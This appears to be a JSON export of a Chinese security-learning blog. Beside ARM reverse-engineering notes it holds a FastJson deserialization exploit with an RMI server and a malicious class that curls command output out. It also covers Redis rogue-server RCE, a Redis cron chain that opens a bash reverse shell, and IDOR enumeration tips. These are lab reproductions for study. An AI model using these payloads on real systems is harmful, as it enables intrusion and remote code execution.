{"meta":{"title":"Misaki's Blog","subtitle":null,"description":"One way to choose one","author":"Misaki","url":""},"pages":[{"title":"Me","date":"2018-09-18T03:14:22.000Z","updated":"2019-01-30T08:08:54.381Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"关于我Web安全爱好者，python级菜鸟，移动安全进行中，喜欢一些新事物，成功性随机。"},{"title":"资料收集","date":"2018-09-20T03:19:11.000Z","updated":"2019-01-30T08:55:14.217Z","comments":true,"path":"data/index.html","permalink":"/data/index.html","excerpt":"","text":"SSRF SSRF漏洞的利用与学习 SSRF攻击实例解析 SSRF漏洞的挖掘经验 XXE XML实体注入漏洞攻与防 浅谈XXE漏洞攻击与防御 Java XXE Vulnerability SSTI 服务端模板注入攻击 Python 模板字符串与模板注入 Exploring SSTI in Flask/Jinja2 XSS 再谈同源策略 跨站的艺术 Browser’s XSS Filter Bypass Cheat Sheet XSS Filter Evasion Cheat Sheet 中文版 SQL SQL注入总结 MSSQL 注入攻击与防御 SQL注入测试技巧TIP 逻辑漏洞 Web安全测试中常见逻辑漏洞解析 未授权访问漏洞的检测与利用 任意用户密码重置（一）：重置凭证泄漏 任意用户密码重置（二）：重置凭证接收端可篡改 任意用户密码重置（三）：用户混淆 任意用户密码重置（四）：重置凭证未校验 任意用户密码重置（五）：重置凭证可暴破 任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数 任意用户密码重置（七）：Token可预测 Web安全测试学习手册-业务逻辑测试 二维码登陆的常见缺陷剖析 渗透测试 Web渗透测试笔记 记一次对某企业的渗透测试实战 渗透测试工具备忘录 API 接口渗透测试 cobalt strike 快速上手 ThinkPHP-漏洞分析集合 RirchFaces反序列化漏洞 系统入侵与远程控制 内网渗透 内网渗透中转发工具总结 Cobalt strike在内网渗透中的使用 windows内网渗透杂谈 Linux 下多种反弹 shell 方法 穿越边界的姿势 Linux内网渗透"}],"posts":[{"title":"结构体链表逆向","slug":"结构体链表逆向","date":"2019-07-26T09:23:50.000Z","updated":"2019-07-26T09:56:41.098Z","comments":true,"path":"2019/07/结构体链表逆向/","link":"","permalink":"/2019/07/结构体链表逆向/","excerpt":"","text":"结构体链表逆向同样使用如下的C代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct _student { char name[32]; int age; struct _student * next; }T_student; T_student * head = NULL; void Insert(const char *name,int age) { T_student * newnode; newnode = (T_student *)malloc(sizeof(T_student)); newnode-&gt;age = age; newnode-&gt;next = head; strcpy(newnode-&gt;name,name); head = newnode; } void PrintStudent() { T_student * tmp; tmp = head; while(tmp) { printf(&quot;name:%s age:%d\\n&quot;,tmp-&gt;name,tmp-&gt;age); tmp=tmp-&gt;next; } } int main() { Insert(&quot;Panda&quot;,15); Insert(&quot;Dog&quot;,3); Insert(&quot;Cat&quot;,2); Insert(&quot;XiaoMing&quot;,20); PrintStudent(); } 按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。 点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。 后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。 获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。 实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。 至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ARM数组重定向","slug":"ARM数组重定向","date":"2019-07-26T09:23:36.000Z","updated":"2019-07-26T09:56:13.330Z","comments":true,"path":"2019/07/ARM数组重定向/","link":"","permalink":"/2019/07/ARM数组重定向/","excerpt":"","text":"ARM数组重定向使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下： #include &lt;stdio.h&gt; // Arrays int g_Table[100]; int g_Table2[100]; void PrintAddr() { printf(&quot;g_Table:0x%x\\ng_Table2:%x\\n&quot;,g_Table,g_Table2); } void InitTable() { int i; for(i=0;i&lt;100;i++) g_Table[i] = i; printf(&quot;Table1 init ok\\n&quot;); for(i=0;i&lt;100;i++) g_Table2[i] = i; } int search(int key) { int i=0; for(;i&lt;100;i++) { if(g_Table[i]==key) return i; } return -1; } int read(int x) { return g_Table[x]; } void write(int x,int value) { g_Table[x] = value; } int main() { int idx; PrintAddr(); InitTable(); write(2,200); write(6,900); if((idx = search(200))!=-1) write(idx,400); } 利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫 选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。 而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。 .text:00000400 LDR R2, =(g_Table_ptr - 0x1FE4) .text:00000404 LDR R2, [R3,R2] ; g_Table 回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始， 在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。 当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。 继续查看第二个循环体，由于跟第一个循环一致，不在细看。 分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。 函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。 在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下 R1 = array[var_8] = array[i] R3 = var_10 = 200 if array[var_8] == var_10: return var_8 最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Redis 主从复制","slug":"Redis-主从复制","date":"2019-07-15T02:16:27.000Z","updated":"2019-07-15T02:37:01.336Z","comments":true,"path":"2019/07/Redis-主从复制/","link":"","permalink":"/2019/07/Redis-主从复制/","excerpt":"","text":"Redis主从复制redis主从复制，前几天分享的新版redis未授权利用的新型方式。 什么是主从复制，http://blog.itpub.net/31545684/viewspace-2213629/ 通过redis命令来设置主从机 127.0.0.1:6379&gt; slaveof 192.168.253.131 6379 被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。 首先需要一个高版本的redis服务，https://redis.io/download。下载后按照官网给的安装步骤来安装。 安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。 执行命令：src/redis-server ./redis.conf，开启redis成功。 下载脚本：https://github.com/Dliv3/redis-rogue-server。启动执行脚本 脚本执行完后显示： 同时可以看到redis日志中加载了so文件： 连接redis执行命令： 所以在未授权访问和弱密码登陆的情况下此问题才可以利用。 原文章：https://paper.seebug.org/975/","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"FastJson 反序列化","slug":"FastJson-反序列化","date":"2019-07-15T02:16:07.000Z","updated":"2019-07-15T02:35:30.420Z","comments":true,"path":"2019/07/FastJson-反序列化/","link":"","permalink":"/2019/07/FastJson-反序列化/","excerpt":"","text":"FastJson 反序列化前一段时间HW护出来一个FastJson的RCE。网上遍布了利用的poc。此处简单模拟一下触发流程。 先下载1.2.47的FastJson，地址：http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/FastJson-1.2.47.jar 利用的JDK为，java_8u60。地址：https://download.oracle.com/otn/java/jdk/8u60-b27/jdk-8u60-windows-x64.exe 使用的IDE为IDEA，下载FastJson后导入IDEA。 从File - Project Structure - Modules - Dependencies导入 创建poc为如下： import com.alibaba.fastjson.JSON; public class poc { public static void main(String[] argv) { String payload = &quot;{\\&quot;name\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},&quot; + &quot;\\&quot;xxxx\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:&quot; + &quot;\\&quot;rmi://localhost:1099/Exploit\\&quot;,\\&quot;autoCommit\\&quot;:true}}}&quot;; JSON.parse(payload); } } 创建一个RMI服务器。可以利用如下的JAVA代码。 import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class rmiServer { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(&quot;Exloit&quot;, &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(&quot;Exploit&quot;,referenceWrapper); } } 或者采用mar创建一个RMI服务器。 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit 再开启一个HTTP服务，下面写入一个恶意class文件。 import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class Exploit implements ObjectFactory { @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) { exec(&quot;xterm&quot;); return null; } public static String exec(String cmd) { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { e.printStackTrace(); } return &quot;&quot;; } public static void main(String[] args) { exec(&quot;123&quot;); } } 此处利用mar创建的RMI服务器来验证： 查看HTTP服务，可以看到请求的恶意class请求。 如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333 当然如果也可以使用之前老RCE的恶意class文件 import java.io.BufferedInputStream; import java.io.BufferedReader; import java.io.InputStreamReader; public class exploit2 { public static String exec(String cmd) throws Exception { String sb = &quot;&quot;; BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr = inBr.readLine()) != null) sb += lineStr + &quot;\\n&quot;; inBr.close(); in.close(); return sb; } public exploit2() throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://localhost:8000/&quot;+result; throw new Exception(exec(cmd)); } public static void main(String[] args) throws Exception { String result = &quot;&quot;; result = exec(&quot;whoami&quot;); String cmd=&quot;curl http://localhost:8000/&quot;+result; throw new Exception(exec(cmd)); } } 执行后，查看携带响应的请求 内容部分POC来源：https://www.03sec.com/3240.shtml","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"逆向函数分析引用","slug":"逆向函数分析引用","date":"2019-07-09T08:56:32.000Z","updated":"2019-07-26T09:56:38.114Z","comments":true,"path":"2019/07/逆向函数分析引用/","link":"","permalink":"/2019/07/逆向函数分析引用/","excerpt":"","text":"代码编译，使用代码如下: #include &lt;stdio.h&gt; #include &lt;string.h&gt; int fun1() { int a; int b; b=10; a=b++; return a; } int fun2(int a,int b) { return a+b+fun1(); } int fun3(int a,int b,int c,int d,int e,int f,int g,int h) { if(a+b+c &lt; d+e+f){ return a+b+c+fun2(a,f); }else if(a+b+c &gt; d+e+f){ return a+b+c+fun2(b,e); }else{ return 0; } } int main() { int tmp; printf(&quot;%d&quot;,fun3(1,2,3,4,5,6,7,8)); return 0; } makefile文件同之前的基本一致 #设置目录 NDK_ROOT=D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT=$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT=$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE=$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB=$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME=app6 BUILD_TYPE=c PATH_ANDROID=/data/local/tmp/ RM=del FLAGS=-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS=$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击main函数，如下： 其中已经简单分析函数参数的引用，开头可以看到，参数[sp]，意思是第五个参数引用，若后面还有其他参数则以四个字节为参数引用存储。关于寄存器的含义 r0-r3 用作传入函数参数，传出函数返回值。在子程序调用之间，可以将 r0-r3 用于任何用途。 r4-r11 被用来存放函数的局部变量。如果被调用函数使用了这些寄存器，它在返回之前必须恢复这些寄存器的值。 r12 是内部调用暂时寄存器 ip。它在过程链接胶合代码（例如，交互操作胶合代码）中用于此角色。 r13 是栈指针 sp。它不能用于任何其它用途。sp 中存放的值在退出被调用函数时必须与进入时的值相同。 r14 是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复 r15 是程序计数器 PC。它不能用于任何其它用途。 详细介绍参考：https://www.veryarm.com/36274.html 到BL指令，BL指令是有返回的跳转，表示子程序的返回通过LR寄存器保存，保存的地址值就是下一条指令的地址值。如下的fun3函数中，对于多参数并没有使用栈来保存，而是使用R0-R3寄存器来循环的调用。 判断结束后进入不同的分支，走到如图中的两部分分支的时候出现了一个新的子程序调用，fun2。 点击fun2，其中又调用了fun1函数，同样点击fun1。 通过fun1就可以看到函数的具体操作行为，其中最后返回值BX，带状态切换返回，其中的LR则为fun2的函数MOV的地址值，返回到fun2中继续执行。 而fun2中的最后代码也对应了开头的两个汇编语句，恢复sp指令值，将栈内容恢复到寄存器中。获取到参数值后，回到MOV指令中其中注释的fun1和fun2代表当前分支的输入参数。最后都执行到loc_4B8，结果保存到R0中返回，最后也是恢复sp和寄存器。 这时候再看main函数最后执行，获取的fun3返回赋值给R2，至于LDR和ADD，代表了读取unk_5C8标记处的参数字段，点击则可以看到是“%d”，也就是R3代表“%d”,R1代表参数返回值。由printf来输出。最后返回0。结束函数执行。 此汇编分析主要是函数调用和返回之间的联系，希望也可以为后面的读取APP so文件打下基础把。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ARM原生循环语句逆向分析","slug":"ARM原生循环语句逆向分析","date":"2019-07-03T07:09:57.000Z","updated":"2019-07-26T09:56:09.610Z","comments":true,"path":"2019/07/ARM原生循环语句逆向分析/","link":"","permalink":"/2019/07/ARM原生循环语句逆向分析/","excerpt":"","text":"代码编译使用的代码为非虫的Android软件安全权威指南，app6.c 代码如下： #include &lt;stdio.h&gt; int nums[5] = {1, 2, 3, 4, 5}; int for1(int n) { int i = 0; int s = 0; for (i = 0; i &lt; n; i++) { s += i * 2; } return s; } int for2(int n) { int i = 0; int s = 0; for (i = 0; i &lt; n; i++) { s += i * i + nums[n - 1]; } return s; } int dowhile(int n) { int i = 1; int s = 0; do { s += i; } while (i++ &lt; n); return s; } int whiledo(int n) { int i = 1; int s = 0; while (i &lt;= n) { s += i++; } return s; } void if1(int n) { if (n &lt; 10) { printf(&quot;the number less than 10\\n&quot;); } else { printf(&quot;the number greater than or equal to 10\\n&quot;); } } void if2(int n) { if (n &lt; 16) { printf(&quot;he is a boy\\n&quot;); } else if (n &lt; 30) { printf(&quot;he is a young man\\n&quot;); } else if (n &lt; 45) { printf(&quot;he is a strong man\\n&quot;); } else { printf(&quot;he is an old man\\n&quot;); } } int main(int argc, char *argv[]) { printf(&quot;for1:%d\\n&quot;, for1(5)); printf(&quot;for2:%d\\n&quot;, for2(5)); printf(&quot;dowhile:%d\\n&quot;, dowhile(100)); printf(&quot;while:%d\\n&quot;, whiledo(100)); if1(5); if2(35); return 0; } 删除了其中的switch函数，编译的时候函数一直报错，使用make编译，创建jni目录，把c文件和Makefile放入到目录中，修改文件为如下： #设置目录 NDK_ROOT=D:\\Androidstudio-sdk\\android-ndk-r14b TOOLCHAINS_ROOT=$(NDK_ROOT)\\toolchains\\arm-linux-androideabi-4.9\\prebuilt\\windows-x86_64 TOOLCHAINS_PREFIX=$(TOOLCHAINS_ROOT)\\bin\\arm-linux-androideabi TOOLCHAINS_INCLUDE=$(TOOLCHAINS_ROOT)\\lib\\gcc\\arm-linux-androideabi\\4.9.x\\include-fixed PLATFORM_ROOT=$(NDK_ROOT)\\platforms\\android-14\\arch-arm PLATFORM_INCLUDE=$(PLATFORM_ROOT)\\usr\\include PLATFORM_LIB=$(PLATFORM_ROOT)\\usr\\lib MODULE_NAME=app6 BUILD_TYPE=c PATH_ANDROID=/data/local/tmp/ RM=del FLAGS=-I$(TOOLCHAINS_INCLUDE) \\ -I$(PLATFORM_INCLUDE) \\ -L$(PLATFORM_LIB) \\ -nostdlib \\ -lgcc \\ -Bdynamic \\ -lc \\ -O0 OBJS=$(MODULE_NAME).o \\ $(PLATFORM_LIB)\\crtbegin_dynamic.o \\ $(PLATFORM_LIB)\\crtend_android.o all: $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -c $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).o -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) -S $(MODULE_NAME).$(BUILD_TYPE) -o $(MODULE_NAME).S -pie -fPIE $(TOOLCHAINS_PREFIX)-gcc $(FLAGS) $(OBJS) -o $(MODULE_NAME) -pie -fPIE clean: $(RM) *.o install: adb push $(MODULE_NAME) $(PATH_ANDROID) adb shell chmod 755 $(PATH_ANDROID)$(MODULE_NAME) adb shell $(PATH_ANDROID)$(MODULE_NAME) 编译后如下，会生成一个无后缀的可执行文件。丢到IDA中。点击for1函数，空格切换图形视图。一般看到这种形式的箭头指向的时候基本就是for或者while语句。 1. for1函数查看第一个汇编指令块，创建了三个函数，开头先做了保存子程序现场，开启堆栈空间。R0-R3，是用作传入变量寄存器，所以此处有三个变量，分别为，var_10, var_8, var_c。最后强制跳转到loc_3e8标记处。 loc_3e8处的汇编代码块，从存储器中加载两个变量值到R2，R3然后对比两个变量，如果R2小于R3，则跳转到loc_3c8标记处。其中对var_8做了一次逻辑左移处理，相当于R3 = R3 * 2^1。再获取变量var_c，执行操作R3 = R3 +R2，再存储到存储器中。下面就相当于for循环中的循环变量自加。最后循环跳出后，再把var_c的值返回。 按照以上逻辑写一段C代码，如下： int for1(int var_10){ int var_8 = 0; int var_c = 0; for(var_8 = 0; var_8 &lt; var_10; var_8++){ var_c = var_c + var_8 &lt;&lt; 1; } return var_c; } 2. for2函数for2跟如上的for1基本类似，就是内部处理处有点不一样，其中nums，点击一下就可以看到是五位的数组，具体是，先var_8自乘，然后读取nums数组，R3为nums数组的地址值，也就是nums[var_10 -1]，再加var_8的自乘和var_c。 C代码： int nums[5] = {1,2,3,4,5}; int for2(int var_10){ int var_8 = 0; int var_c = 0; for(var_8 = 0; var_8 &lt; var_10; var_8++){ var_c =var_c + var_8* var_8 + nums[var_10 - 1]; } return var_c; } 3. dowhile函数其中大部分都类似以上汇编代码，其中dowhile和whiledo存在有明显不同，dowhile是先执行内部的汇编代码，变量执行自加等操作，最后在判断是否一致，循环体上大致类似如下图，而whiledo更类似于如上的for循环体。汇编中并没有强制跳转，而且跳转标记在判断跳转处的上方。 根据汇编代码写出大致的C代码。 int dowhile(int var_10){ int var_8 = 1; int var_c = 0; do{ var_c = var_8 + var_c; var_8 = var_8 + 1; }while(var_8 &lt; var_10) return var_c } 4. whiledo函数whiledo从结构体上和for1相同，本来这两种循环就及其类似，主要查看的时候能分清while循环的特点和逻辑来区分，哪个参数为判断参数，哪个参数为计算参数。在B指令执行的地方，就为for和while的判断指令。 根据汇编代码写出大致的C代码。 int whiledo(int var_10){ int var_8 = 1; int var_c = 0; while(var_8 &lt;= var_10){ var_8 = var_8 + 1; var_c = var_c + var_8; } return var_c } 5. if1 函数如下，具有单分支的if结构体可以看出是if-else判断形式 按照汇编意思，C代码如下： void if1(int var_8){ if(var_8 &gt; 9){ puts(&quot;the number greater than or equal to 10&quot;); }else{ puts(&quot;the number less than 10&quot;); } } 在if判断中，判断体在汇编中和原代码是相反的，意思是var_8 &gt; 9原文应该是var_8 &lt;=9 。printf也由puts来改变输出，puts输出会自动添加换行符，也就不在需要原文中的\\n。 void if1(int var_8){ if(var_8 &lt;= 9){ puts(&quot;the number less than 10&quot;); }else{ puts(&quot;the number greater than or equal to 10&quot;); } } 6. if2函数多判断结构体，也就是if-else-if 其中可以看到有多个LDR计算赋值指令，此处的LDR和MOV类似，只是有些时候MOV不适合使用，所以用LDR来赋值计算。 LDR R3, =(aHeIsABoy - 0x5D0) 代表意思就是，aHeIsABoy的地址值减去0x5D0，赋值给R3。仔细看一下就可以明白，其中的参数都是原字符串。LDR就是aHeIsABoy减去0x5D0，此处是07EC减去0x5D0，为021C。而PC，程序计数器，指的是BL的地址值。详细参考：https://www.cnblogs.com/ichunqiu/p/9056630.html 也就是说，执行到ADD的时候，MOV在译码阶段，BL在取址阶段。PC寄存器总是指向随后的第三条指令。 用BL的地址值加上R3，05D0加上021C为7EC，也就是aHeIsABoy的地址值，当然IDA已经识别出来并注释到其后。再把字符串由puts输出。 LDR R3, =(aHeIsABoy - 0x5D0) //000007EC aHeIsABoy DCB &quot;he is a boy&quot;,0 ADD R3, PC, R3 ; &quot;he is a boy&quot; MOV R0, R3 ; s BL puts B loc_628 按照汇编意思，C代码如下： void if2(int var_8){ if(var_8 &gt; 15){ if(var_8 &gt; 29){ if(var_8 &gt; 44){ puts(&quot;he is an old man&quot;); } else{ puts(&quot;he is a strong man&quot;); } } else{ puts(&quot;he is a young man&quot;); } } else{ puts(&quot;he is a boy&quot;); } } 由于汇编对判断的形式，用else if的形式可以这么写 void if2(int var_8){ if(var_8 &lt;= 15){ puts(&quot;he is a boy&quot;); } else if(var_8 &lt;= 29){ puts(&quot;he is a young man&quot;); } else if(var_8 &lt;= 44){ puts(&quot;he is a strong man&quot;); } else{ puts(&quot;he is an old man&quot;); } } 看完以上的汇编分析后，可以得到循环体的特点，循环体一般为以下： .... //汇编代码 B loc_xxx .... CMP r1, r2 BXX loc_xxx .... BX LR 判断形式一般为以下： .... CMP R1, R2 BXX loc_xxx .... loc_xxx .... B loc_zzz loc_zzz .... 当然，以上CMP后并不一定会跟随B指令，也会由其他条件执行指令，例如： CMP R2, R3 ADDEQ R2, R3, #1 其中寄存器存值，仍然是需要注意点，不小心会看错赋值，如下： LDR R3, [R11,#var_8] LDR R2, [R11,#var_C] ADD R3, R2, R3 在执行一些类似ADD的指令操作后，其中的R3已不在代表var_8，其中的结果跟ADD后所获取到的R3赋值有关，这种情况可以看成： a = 1; b = 2; a = a + b; //3 所以，其中a的值已不在是1，同样如上中，R3也为此，在初期可能在不能连续查看汇编代码的情况下，会犯这种失误。 main 函数main函数中的赋值和返回值寄存器对应之前函数中的返回和赋值，如MOV R0, #5。在for1中，R0赋值给var_10。 同时返回值在R0中。 下部汇编类似，就不在一步步看啦。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"越权/未授权访问","slug":"越权-未授权访问","date":"2019-06-18T03:27:13.000Z","updated":"2019-06-18T07:00:48.215Z","comments":true,"path":"2019/06/越权-未授权访问/","link":"","permalink":"/2019/06/越权-未授权访问/","excerpt":"","text":"0x01、漏洞简介未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：垂直越权，水平越权。而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。 0x02、漏洞原理未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。 0x03、漏洞危害未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。 0x04、漏洞测试方法0x04-1、常见的未授权服务0x04-1-1、redis未授权访问此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。 root@kali:~# redis-cli -h 192.168.63.130 192.168.63.130:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot; OK 192.168.63.130:6379&gt; config set dir /var/spool/cron/ OK 192.168.63.130:6379&gt; config set dbfilename root OK 192.168.63.130:6379&gt; save OK 0x04-1-2、Jenkins未授权访问默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 http://www.secpulse.com:8080/manage http://www.secpulse.com:8080/script 选择脚本命令行可以执行一些系统命令。 0x04-1-3、MongoDB未授权访问开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。 0x04-1-4、Memcache未授权访问Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。 关于未授权访问的可以查看：https://www.secpulse.com/archives/61101.html 0x04-2、基于用户ID的越权举个例子： https://www.xxx.com/user1/userinfo.php?user_id=user1 https://www.xxx.com/user1/userinfo.php?user_id=10001 我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。 如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。 0x04-3、基于功能对象ID的越权举个例子： https://www.xxx.com/user1/userticket.php?user_order=100001 https://www.xxx.com/user1/userticket.php?user_order=49ba59ab 此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。 0x04-4、基于上传文件对象ID的越权举个例子： https://www.xxx.com/user1/userfile.php?fileid=10001 